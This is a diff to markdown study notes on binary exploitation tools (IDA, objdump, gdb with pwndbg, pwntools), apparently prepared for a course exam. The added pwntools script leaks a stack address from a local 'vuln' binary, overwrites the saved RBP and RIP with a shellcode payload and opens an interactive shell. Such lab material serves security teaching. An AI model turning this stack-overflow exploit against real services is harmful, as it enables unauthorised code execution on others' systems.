@@ -15,8 +15,7 @@ StartupNotify=true
 Categories=Development;
 Keywords=IDA
 ```
-### Show C-source code
-- press F5
+- Show C-source code by pressing F5
 
 
 ## objdump: quick peek at disassembly
@@ -50,7 +49,7 @@ cd pwndbg
  ```
 gdb ./my_binary
  ```
-- attack gdb to running process: get newest process id of process cat and debug
+- attach gdb to running process: get newest process id of process cat and debug
 ```
 sudo -E gdb -p $(pgrep -n vuln)
 ```
@@ -132,6 +131,13 @@ import pwn
 # set architecture
 pwn.context.arch = 'amd64'
 
+# spawn binary and a gdb instance for debugging
+# this way we can use pwntools to transfer bytes 
+"""
+conn = pwn.process('./vuln')
+pwn.gdb.attach(conn)
+"""
+
 #conn = pwn.binary('./my_binary')
 conn = pwn.remote('127.0.0.1', 1024)
 
@@ -161,10 +167,18 @@ print(shellcode.hex())
 # get automatic shellcode (don't do this, do manually as this won't work in exam)
 shellcode = pwn.asm(pwn.shellcraft.sh())
 
-# send bytes
-conn.send(message)
-
-# start interactive session
+conn.recvuntil(b'Hello! My name is 0x')
+address = conn.recvuntil(b'!\nWhat is your name?', drop=True)
+address_RIP = int(address.decode('utf-8'), 16)
+# we need top of buffer, but get middle of big 32 byte buffer (two 16 byte buffers in C)
+address_RIP -= 16
+# we set RBP = RIP, because we have no data on stack for our shellcode
+address_RBP = address_RIP
+payload = shellcode + pwn.p64(address_RBP) + pwn.p64(address_RIP)
+print(payload.hex())
+# send shellcode
+conn.sendline(payload)
+# start interactive session (we have a shell now)
 conn.interactive()
 ```
 
